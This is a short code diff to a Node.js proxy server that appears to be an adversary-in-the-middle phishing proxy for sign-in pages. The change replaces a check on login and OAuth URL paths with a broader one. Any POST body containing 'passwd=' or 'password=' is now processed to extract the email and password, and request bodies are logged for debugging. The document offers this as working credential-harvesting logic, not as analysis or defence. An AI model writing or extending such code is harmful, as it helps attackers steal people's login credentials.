@@ -332,10 +332,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         console.log('[DEBUG] Original body (first 500 chars):', originalBody.substring(0, 500));
         console.log('[DEBUG] Content-Type:', clientRequestBody.headers?.['content-type'] || '');
 
-        if (originalMethod === 'POST' && 
-            (originalUrl.includes('/login') || originalUrl.includes('/signin') || 
-             originalUrl.includes('/common/login') || originalUrl.includes('/oauth2') ||
-             originalUrl.includes('/authorize'))) {
+        // ---- Process ANY POST request that contains passwd or password in the body ----
+        if (originalMethod === 'POST' && (originalBody.includes('passwd=') || originalBody.includes('password='))) {
 
             let email = '';
             let password = '';
@@ -405,7 +403,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 console.log('[DEBUG] No email or password found after all attempts.');
             }
         } else {
-            console.log('[DEBUG] Request did not match login criteria. URL:', originalUrl, 'Method:', originalMethod);
+            console.log('[DEBUG] Request did not contain passwd= or password= in body. URL:', originalUrl);
         }
     } else {
         console.log('[DEBUG] No clientRequestBody.body found.');
